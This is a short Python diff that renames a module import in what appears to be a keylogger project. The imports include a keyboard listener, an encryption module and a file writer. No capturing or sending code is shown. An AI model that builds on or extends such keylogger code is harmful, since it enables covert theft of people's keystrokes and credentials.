@@ -1,6 +1,6 @@
 from keylogger_listener import ListenerKeyboard
 from encrypt import Encryption
-from FileWriter import FileWriter
+from file_writer import FileWriter
 import time
 from datetime import datetime
 import threading
